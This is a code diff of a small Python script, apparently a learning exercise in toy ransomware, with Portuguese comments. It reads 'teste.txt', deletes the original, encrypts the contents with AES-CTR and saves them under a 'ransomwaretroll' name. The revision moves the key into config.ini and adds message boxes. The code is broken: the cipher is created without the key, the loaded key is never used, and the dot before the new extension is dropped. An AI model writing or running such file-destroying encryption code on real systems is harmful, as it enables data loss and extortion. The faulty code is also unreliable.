@@ -1,24 +1,31 @@
 import os
 import pyaes
+from tkinter import messagebox
+from configparser import ConfigParser
 
-## abrir o arquivo a ser criptografado
+def catch_Key():
+    config = ConfigParser()
+    config.read('config.ini')
+    return config.get('configurações','chave_criptografia')
+
 file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
 
-## remover o arquivo
-os.remove(file_name)
+try:
+    with open(file_name, "rb") as file:
+        file_data = file.read()
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+    os.remove(file_name)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+    Chave = catch_Key()
+    aes = pyaes.AESModeOfOperationCTR()
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+    crypto_data = aes.encrypt(file_data)
+
+    new_file_name = file_name + "ransomwaretroll"
+    with open(new_file_name, 'wb') as new_file:
+        new_file.write(crypto_data)
+
+    messagebox.showinfo("Arquivos criptografados com sucessos")
+
+except Exception as e:
+    messagebox.showerror("Erro", f"Ocorreu um erro: {str(e)}")
